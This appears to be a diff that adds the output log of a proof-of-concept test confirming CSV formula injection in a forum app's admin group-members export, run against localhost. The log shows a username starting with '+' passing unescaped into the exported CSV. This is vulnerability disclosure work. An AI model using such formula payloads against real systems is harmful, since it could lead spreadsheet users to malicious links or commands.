@@ -1,0 +1,17 @@
+==============================================================================
+VULN-010: CSV/formula injection in group-members export (missing neutralizeCsvFormula)
+Target: http://localhost:21372
+==============================================================================
+[INFO] group export omits neutralizeCsvFormula (src/controllers/admin/groups.js:97-105); users export applies it (src/user/admin.js:106-110)
+[SETUP] creating unprivileged user with formula-triggering username: '+HYPERLINK_6a600426'
+[SETUP] created uid=9, stored username='+HYPERLINK_6a600426'
+[SETUP] creating group csvgrp_6a600426 and adding the user
+[INFO] add-member HTTP 200
+[STEP] admin GET /api/admin/groups/csvgrp_6a600426/csv
+[INFO] group CSV username cell = '+HYPERLINK_6a600426'
+[STEP] admin GET /api/admin/users/csv (the sibling that DOES neutralize)
+[INFO] users CSV username cell = None
+------------------------------------------------------------------------------
+[PROOF] the GROUP CSV emits the username cell '+HYPERLINK_6a600426' beginning with a formula trigger and NOT prefixed with an apostrophe -> a spreadsheet interprets it as a formula
+[OK] exploit confirmed — group-members CSV export is vulnerable to formula/CSV injection
+==> VULN-010: CONFIRMED — group-members CSV export omits formula neutralization
